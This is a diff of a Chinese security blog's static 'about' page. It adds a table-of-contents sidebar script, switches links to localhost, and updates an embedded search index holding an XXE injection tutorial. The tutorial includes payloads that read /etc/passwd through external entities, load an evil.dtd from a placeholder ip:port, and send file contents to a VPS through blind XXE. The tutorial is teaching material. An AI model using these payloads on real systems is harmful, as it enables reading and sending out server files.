@@ -9,7 +9,7 @@
 <meta name="description" content="生如逆旅，一苇以航。">
 <meta name="theme-color" content="#000">
 <title>关于 | outlaws&#39; blog</title>
-<link rel="shortcut icon" href="/favicon.ico?v=1616118580830">
+<link rel="shortcut icon" href="/favicon.ico?v=1616122072681">
 <link rel="stylesheet" href="/media/css/mist.css">
 <link rel="stylesheet" href="/media/fonts/font-awesome.css">
 <link
@@ -190,6 +190,263 @@
 
 <div class="sidebar">
   
+    <div class="sidebar-box box-shadow-wrapper  right-motion" id="sidebar">
+      
+        <div class="post-list-sidebar">
+          <div class="sidebar-title">
+            <span id="tocSideBar" class="sidebar-title-item sidebar-title-active language" data-lan="index">文章目录</span>
+            <span id="metaSideBar" class="sidebar-title-item language" data-lan="preview">站点概览</span>
+          </div>
+        </div>
+      
+      <div class="sidebar-body mist" id="sidebar_body">
+        
+          
+            <div class="post-side-meta" id="post_side_meta">
+              
+<div class="sidebar-wrapper box-shadow-wrapper ">
+  <div class="sidebar-item">
+    <img class="site-author-image right-motion" src="/images/avatar.png"/>
+    <p class="site-author-name">outlaws&#39;s blog</p>
+    
+  </div>
+  <div class="sidebar-item side-item-stat right-motion">
+    <div class="sidebar-item-box">
+      <a href="/archives/">
+        
+        <span class="site-item-stat-count">2</span>
+        <span class="site-item-stat-name language" data-lan="article">文章</span>
+      </a>
+    </div>
+    <div class="sidebar-item-box">
+      <a href="">
+        <span class="site-item-stat-count">4</span>
+        <span class="site-item-stat-name language" data-lan="category">分类</span>
+      </a>
+    </div>
+    <div class="sidebar-item-box">
+      <a href="/tags/">
+        <span class="site-item-stat-count">4</span>
+        <span class="site-item-stat-name language" data-lan="tag">标签</span>
+      </a>
+    </div>
+  </div>
+  
+  
+    <div class="sidebar-item sidebar-item-social">
+      <div class="social-item">
+        
+          
+            <a href="https://github.com/outlaws-bai">
+              <i class="fa fa-github-alt" title="github"></i>
+            </a>
+          
+        
+        
+      </div>
+    </div>
+  
+
+
+
+</div>
+            </div>
+            <div class="post-toc sidebar-body-active" id="post_toc" style="opacity: 1;">
+              <div class="toc-box right-motion">
+  <div class="toc-wrapper auto-number auto"
+    id="toc_wrapper">
+    <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E5%85%B3%E4%BA%8E%E6%9C%AC%E7%AB%99">🏠 关于本站</a></li>
+<li><a href="#%E5%8D%9A%E4%B8%BB%E6%98%AF%E8%B0%81">👨‍💻 博主是谁</a></li>
+<li><a href="#%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD">⛹ 兴趣爱好</a></li>
+<li><a href="#%E8%81%94%E7%B3%BB%E6%88%91%E5%91%80">📬 联系我呀</a></li>
+</ul>
+</li>
+</ul>
+
+  </div>
+</div>
+
+<script>
+
+  let lastTop = 0, lList = [], hList = [], postBody, lastIndex = -1;
+  let active = 'active-show', activeClass = 'active-current';
+  let tocWrapper = document.querySelector('#toc_wrapper');
+  let tocContent = tocWrapper.children[0];
+  let autoNumber = tocWrapper && tocWrapper.classList.contains('auto-number');
+
+  function addTocNumber(elem, deep) {
+    if (!elem) {
+      return;
+    }
+    let prop = elem.__proto__;
+
+    if (prop === HTMLUListElement.prototype) {
+      for (let i = 0; i < elem.children.length; i++) {
+        addTocNumber(elem.children[i], deep + (i + 1) + '.');
+      }
+    } else if (prop === HTMLLIElement.prototype) {
+      // 保存li元素
+      if (elem.children[0] && elem.children[0].__proto__ === HTMLAnchorElement.prototype) {
+        lList.push(elem);
+      }
+      for (let i = 0; i < elem.children.length; i++) {
+        let cur = elem.children[i];
+        if (cur.__proto__ === HTMLAnchorElement.prototype) {
+          if (autoNumber) {
+            cur.text = deep + ' ' + cur.text;
+          }
+        } else if (cur.__proto__ === HTMLUListElement.prototype) {
+          addTocNumber(cur, deep);
+        }
+      }
+    }
+  }
+
+  function removeParentActiveClass() {
+    let parents = tocContent.querySelectorAll('.' + active)
+    parents.forEach(function (elem) {
+      elem.classList.remove(active);
+    });
+  }
+
+  function addActiveClass(index) {
+    if (index >= 0 && index < hList.length) {
+      lList[index].classList.add(activeClass);
+    }
+  }
+
+  function removeActiveClass(index) {
+    if (index >= 0 && index < hList.length) {
+      lList[index].classList.remove(activeClass);
+    }
+  }
+
+  function addActiveLiElemment(elem, parent) {
+    if (!elem || elem === parent) {
+      return;
+    } else {
+      if (elem.__proto__ === HTMLLIElement.prototype) {
+        elem.classList.add(active);
+      }
+      addActiveLiElemment(elem.parentElement, parent);
+    }
+  }
+
+  function showToc() {
+    if (tocWrapper) {
+      postBody = document.querySelector('#post_body');
+      for (let i = 0; i < postBody.children.length; i++) {
+        if (postBody.children[i].__proto__ === HTMLHeadingElement.prototype) {
+          hList.push(postBody.children[i]);
+        }
+      }
+      if (tocWrapper.classList.contains('compress')) {
+        tocContent.classList.add('closed');
+      } else if (tocWrapper.classList.contains('no_compress')) {
+        tocContent.classList.add('expanded');
+      } else {
+        if (hList.length > 10) {
+          active = 'active-hidden'
+          tocContent.classList.add('closed');
+        } else {
+          tocContent.classList.add('expanded');
+        }
+      }
+    }
+  }
+
+  (function () {
+    // 处理不是从#一级标题开始目录
+    if (tocContent.children.length === 1 && tocContent.children[0].__proto__ === HTMLLIElement.prototype) {
+      let con = tocContent.children[0].children[0];
+      tocContent.innerHTML = con.innerHTML;
+    }
+    let markdownItTOC = document.querySelector('.markdownIt-TOC');
+    let innerHeight = window.innerHeight;
+    markdownItTOC.style = `max-height: ${innerHeight - 80 > 0 ? innerHeight - 80 : innerHeight}px`
+    addTocNumber(tocContent, '');
+  })();
+
+  document.addEventListener('scroll', function (e) {
+    if (lList.length <= 0) {
+      return;
+    }
+    let scrollTop = document.scrollingElement.scrollTop + 10;
+    let dir;
+
+    if (lastTop - scrollTop > 0) {
+      dir = 'up';
+    } else {
+      dir = 'down';
+    }
+
+    lastTop = scrollTop;
+    if (scrollTop <= 0) {
+      if (lastIndex >= 0 && lastIndex < hList.length) {
+        lList[lastIndex].classList.remove(activeClass);
+      }
+      return;
+    }
+
+    let current = 0, hasFind = false;
+    for (let i = 0; i < hList.length; i++) {
+      if (hList[i].offsetTop > scrollTop) {
+        current = i;
+        hasFind = true;
+        break;
+      }
+    }
+    if (!hasFind && scrollTop > lList[lList.length - 1].offsetTop) {
+      current = hList.length - 1;
+    } else {
+      current--;
+    }
+    if (dir === 'down') {
+      if (current > lastIndex) {
+        addActiveClass(current);
+        removeActiveClass(lastIndex)
+        lastIndex = current;
+        removeParentActiveClass();
+        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
+      }
+    } else {
+      if (current < lastIndex) {
+        addActiveClass(current);
+        removeActiveClass(lastIndex);
+        lastIndex = current;
+        removeParentActiveClass();
+        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
+      }
+    }
+  });
+
+
+  window.addEventListener('load', function () {
+    showToc();
+    document.querySelector('#sidebar').style = 'display: block;';
+    tocWrapper.classList.add('toc-active');
+    setTimeout(function () {
+      if ("createEvent" in document) {
+        let evt = document.createEvent("HTMLEvents");
+        evt.initEvent("scroll", false, true);
+        document.dispatchEvent(evt);
+      }
+      else {
+        document.fireEvent("scroll");
+      }
+    }, 500)
+  })
+
+</script>
+            </div>
+          
+        
+      </div>
+    </div>
+  
 </div>
 <script>
   const SIDEBAR_TITLE_ACTIVE = 'sidebar-title-active';
@@ -272,7 +529,7 @@
           <div class="section bg-color post post-page">
             <section class="post-header">
   <h1 class="post-title">
-    <a class="post-title-link" href="https://outlaws-bai.github.io/post/about/">
+    <a class="post-title-link" href="http://localhost:4000/post/about/">
       关于
     </a>
   </h1>
@@ -757,14 +1014,12 @@
     <div class="result" id="result">
       
       <div class="item">
-        <a class="result-title" style="opacity: 0;" href="https://outlaws-bai.github.io/post/xxe/"" data-c="
-          &lt;h1 id=&#34;xxe&#34;&gt;XXE&lt;/h1&gt;
-&lt;p&gt;xxe全程XML External Entity Injection，也就是XML外部实体注入攻击，是对非安全的外部实体数据进行处理时引发的安全问题。&lt;/p&gt;
+        <a class="result-title" style="opacity: 0;" href="http://localhost:4000/post/xxe/"" data-c="
+          &lt;p&gt;xxe全程XML External Entity Injection，也就是XML外部实体注入攻击，是对非安全的外部实体数据进行处理时引发的安全问题。&lt;/p&gt;
 &lt;p&gt;如今的 web 时代，是一个前后端分离的时代，有人说 MVC 就是前后端分离，但我觉得这种分离的并不彻底，后端还是要尝试去调用渲染类去控制前端的渲染，我所说的前后端分离是，后端 api 只负责接受约定好要传入的数据，然后经过一系列的黑盒运算，将得到结果以 json 格式返回给前端，前端只负责坐享其成，拿到数据json.decode 就行了（这里的后端可以是后台代码，也可以是外部的api 接口，这里的前端可以是传统意义的前端，也可以是后台代码）&lt;/p&gt;
 &lt;p&gt;那么问题经常就出现在 api 接口能解析客户端传过来的 xml 代码，并且直接外部实体的引用，&lt;/p&gt;
-&lt;h2 id=&#34;xml基础知识&#34;&gt;XML基础知识&lt;/h2&gt;
+&lt;h1 id=&#34;xml基础知识&#34;&gt;XML基础知识&lt;/h1&gt;
 &lt;p&gt;XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。&lt;/p&gt;
-&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://outlaws-bai.github.io/post-images/1616117231952.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
 &lt;p&gt;&lt;strong&gt;示例代码：&lt;/strong&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;ISO-8859-1&amp;quot;?&amp;gt;
 &amp;lt;!DOCTYPE foo [
@@ -779,30 +1034,27 @@
 &amp;lt;/creds&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;我们使用 &amp;amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;amp;xxe 就会被 &amp;quot;test&amp;quot; 替换。&lt;/p&gt;
-&lt;h2 id=&#34;dtd文档类型定义&#34;&gt;DTD(文档类型定义)&lt;/h2&gt;
+&lt;h1 id=&#34;dtd文档类型定义&#34;&gt;DTD(文档类型定义)&lt;/h1&gt;
 &lt;p&gt;DTD作用就是区定义xml文档的合法构建 模块，也就是说声明了xml的内容格式规范。&lt;/p&gt;
-&lt;p&gt;**1内部DTD：即对XML文档的元素、属性和实体的DTD的声明都在xml文档中。&lt;/p&gt;
-&lt;p&gt;**2外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件(.dtd)中。&lt;/p&gt;
-&lt;h3 id=&#34;内部的doctype&#34;&gt;内部的DOCTYPE&lt;/h3&gt;
+&lt;p&gt;1内部DTD：即对XML文档的元素、属性和实体的DTD的声明都在xml文档中。&lt;/p&gt;
+&lt;p&gt;2外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件(.dtd)中。&lt;/p&gt;
+&lt;h2 id=&#34;内部的doctype&#34;&gt;内部的DOCTYPE&lt;/h2&gt;
 &lt;pre&gt;&lt;code class=&#34;language-xml-dtd&#34;&gt;&amp;lt;!DOCTYPE 根元素 [元素声明]&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&#34;外部的文档声明&#34;&gt;外部的文档声明&lt;/h3&gt;
+&lt;h2 id=&#34;外部的文档声明&#34;&gt;外部的文档声明&lt;/h2&gt;
 &lt;pre&gt;&lt;code class=&#34;language-xml-dtd&#34;&gt;&amp;lt;!DOCTYPE 根元素 SYSTEM &amp;quot;文件名&amp;quot;&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&#34;dtd实体&#34;&gt;DTD实体&lt;/h2&gt;
-&lt;h3 id=&#34;内部实体声明&#34;&gt;内部实体声明&lt;/h3&gt;
+&lt;h1 id=&#34;dtd实体&#34;&gt;DTD实体&lt;/h1&gt;
+&lt;h2 id=&#34;内部实体声明&#34;&gt;内部实体声明&lt;/h2&gt;
 &lt;pre&gt;&lt;code class=&#34;language-xml-dtd&#34;&gt;&amp;lt;!ENTITY 实体名称 &amp;quot;实体的值&amp;quot;&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&#34;外部实体声明&#34;&gt;外部实体声明&lt;/h3&gt;
+&lt;h2 id=&#34;外部实体声明&#34;&gt;外部实体声明&lt;/h2&gt;
 &lt;pre&gt;&lt;code class=&#34;language-xml-dtd&#34;&gt;&amp;lt;!ENTITY 实体名称 SYSTEM &amp;quot;URI&amp;quot;&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&#34;参数实体声明&#34;&gt;参数实体声明&lt;/h3&gt;
-&lt;pre&gt;&lt;code class=&#34;language-xml-dtd&#34;&gt;&amp;lt;!ENTITY %实体名称 &amp;quot;实体的值&amp;quot;&amp;gt;或者
-
+&lt;h2 id=&#34;参数实体声明&#34;&gt;参数实体声明&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-xml-dtd&#34;&gt;&amp;lt;!ENTITY %实体名称 &amp;quot;实体的值&amp;quot;&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&#34;xxe注入&#34;&gt;XXE注入&lt;/h2&gt;
-&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://outlaws-bai.github.io/post-images/1616117288890.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
-&lt;h3 id=&#34;xxe分类&#34;&gt;XXE分类&lt;/h3&gt;
+&lt;h1 id=&#34;xxe分类&#34;&gt;XXE分类&lt;/h1&gt;
 &lt;p&gt;按照构造外部实体声明的方法不同&lt;/p&gt;
 &lt;p&gt;1.直接通过dtd外部实体声明&lt;/p&gt;
 &lt;p&gt;2.通过dtd文档引入外部dtd文档中的外部实体声明&lt;/p&gt;
@@ -811,10 +1063,8 @@
 &lt;p&gt;1.正常回显XXE&lt;/p&gt;
 &lt;p&gt;2.报错XXE&lt;/p&gt;
 &lt;p&gt;3.Blind XXE&lt;/p&gt;
-&lt;h2 id=&#34;怎样利用&#34;&gt;怎样利用&lt;/h2&gt;
-&lt;h3 id=&#34;1直接通过dtd外部实体声明&#34;&gt;1.直接通过DTD外部实体声明&lt;/h3&gt;
-&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://outlaws-bai.github.io/post-images/1616117349724.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
-&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://outlaws-bai.github.io/post-images/1616117447564.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h1 id=&#34;怎样利用&#34;&gt;怎样利用&lt;/h1&gt;
+&lt;h2 id=&#34;1直接通过dtd外部实体声明&#34;&gt;1.直接通过DTD外部实体声明&lt;/h2&gt;
 &lt;pre&gt;&lt;code class=&#34;language-xml-dtd&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;
 &amp;lt;!DOCTYPE xxe[
     &amp;lt;!ENTITY f SYSTEM &amp;quot;file:///etc/passwd&amp;quot;&amp;gt;
@@ -828,8 +1078,7 @@ eg:
     ]&amp;gt;
 &amp;lt;user&amp;gt;&amp;lt;username&amp;gt;&amp;amp;f;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;123&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&#34;2通过dtd文档引入外部dtd文档的外部实体声明&#34;&gt;2.通过dtd文档引入外部dtd文档的外部实体声明&lt;/h3&gt;
-&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://outlaws-bai.github.io/post-images/1616117486544.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;2通过dtd文档引入外部dtd文档的外部实体声明&#34;&gt;2.通过dtd文档引入外部dtd文档的外部实体声明&lt;/h2&gt;
 &lt;pre&gt;&lt;code class=&#34;language-xml-dtd&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
 &amp;lt;!DOCTYPE xxe SYSTEM &amp;quot;http://ip:port/evil.dtd&amp;quot;&amp;gt;
 &amp;lt;a&amp;gt;&amp;amp;b;&amp;lt;/a&amp;gt;
@@ -837,7 +1086,7 @@ eg:
 #其中的evil.dtd内容如下
 &amp;lt;!ENTITY b SYSTEM &amp;quot;file:///etc/passwd&amp;quot;&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&#34;3通过dtd外部实体声明引入外部dtd文档中的外部实体声明&#34;&gt;3.通过dtd外部实体声明引入外部dtd文档中的外部实体声明&lt;/h3&gt;
+&lt;h2 id=&#34;3通过dtd外部实体声明引入外部dtd文档中的外部实体声明&#34;&gt;3.通过dtd外部实体声明引入外部dtd文档中的外部实体声明&lt;/h2&gt;
 &lt;pre&gt;&lt;code class=&#34;language-xml-dtd&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
 &amp;lt;!DOCTYPE xxe [
     &amp;lt;!ENTITY % file SYSTEM &amp;quot;http://ip:port/evil.dtd&amp;quot;&amp;gt;
@@ -848,7 +1097,7 @@ eg:
 #其中的evil.dtd内容如下
 &amp;lt;!ENTITY b SYSTEM &amp;quot;file:///etc/passwd&amp;quot;&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&#34;4blind-xxe&#34;&gt;4.Blind XXE&lt;/h3&gt;
+&lt;h2 id=&#34;4blind-xxe&#34;&gt;4.Blind XXE&lt;/h2&gt;
 &lt;p&gt;其实就是无法回显，将数据发送至vps&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-xml-dtd&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
 &amp;lt;!DOCTYPE root [
@@ -863,7 +1112,7 @@ eg:
 %int;
 %send;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&#34;利用方式&#34;&gt;利用方式&lt;/h2&gt;
+&lt;h1 id=&#34;利用方式&#34;&gt;利用方式&lt;/h1&gt;
 &lt;p&gt;1.读文件&lt;/p&gt;
 &lt;p&gt;见怎样利用&lt;/p&gt;
 &lt;p&gt;2.执行系统命令&lt;/p&gt;
@@ -878,13 +1127,78 @@ eg:
 &lt;p&gt;5.内网盲注&lt;/p&gt;
 &lt;p&gt;6.文件上传&lt;/p&gt;
 &lt;p&gt;7.钓鱼&lt;/p&gt;
-&lt;h2 id=&#34;支持的协议&#34;&gt;支持的协议&lt;/h2&gt;
-&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://outlaws-bai.github.io/post-images/1616118036929.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h1 id=&#34;支持的协议&#34;&gt;支持的协议&lt;/h1&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;libxml2&lt;/th&gt;
+&lt;th&gt;php&lt;/th&gt;
+&lt;th&gt;java&lt;/th&gt;
+&lt;th&gt;.net&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;file&lt;/td&gt;
+&lt;td&gt;file&lt;/td&gt;
+&lt;td&gt;http&lt;/td&gt;
+&lt;td&gt;file&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;http&lt;/td&gt;
+&lt;td&gt;http&lt;/td&gt;
+&lt;td&gt;https&lt;/td&gt;
+&lt;td&gt;http&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ftp&lt;/td&gt;
+&lt;td&gt;ftp&lt;/td&gt;
+&lt;td&gt;ftp&lt;/td&gt;
+&lt;td&gt;https&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;php&lt;/td&gt;
+&lt;td&gt;file&lt;/td&gt;
+&lt;td&gt;ftp&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;compress.zlib&lt;/td&gt;
+&lt;td&gt;jar&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;compress.zlib&lt;/td&gt;
+&lt;td&gt;netdoc&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;data&lt;/td&gt;
+&lt;td&gt;mailto&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;glob&lt;/td&gt;
+&lt;td&gt;gopher*&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;phar&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
 ">XXE</a>
       </div>
       
       <div class="item">
-        <a class="result-title" style="opacity: 0;" href="https://outlaws-bai.github.io/post/php-serialize&amp;unserialize/"" data-c="
+        <a class="result-title" style="opacity: 0;" href="http://localhost:4000/post/php-serialize&amp;unserialize/"" data-c="
           &lt;h1 id=&#34;序列化与反序列化&#34;&gt;序列化与反序列化&lt;/h1&gt;
 &lt;h2 id=&#34;序列化&#34;&gt;序列化&lt;/h2&gt;
 &lt;p&gt;定义：利用&lt;code&gt;serialize()&lt;/code&gt;函数将一个对象转换为字符串形式&lt;br&gt;
@@ -1664,7 +1978,7 @@ https://xz.aliyun.com/t/2715&lt;br&gt;
       </div>
       
       <div class="item">
-        <a class="result-title" style="opacity: 0;" href="https://outlaws-bai.github.io/post/about/"" data-c="
+        <a class="result-title" style="opacity: 0;" href="http://localhost:4000/post/about/"" data-c="
           &lt;blockquote&gt;
 &lt;p&gt;欢迎来到我的小站呀，很高兴遇见你！🤝&lt;/p&gt;
 &lt;/blockquote&gt;
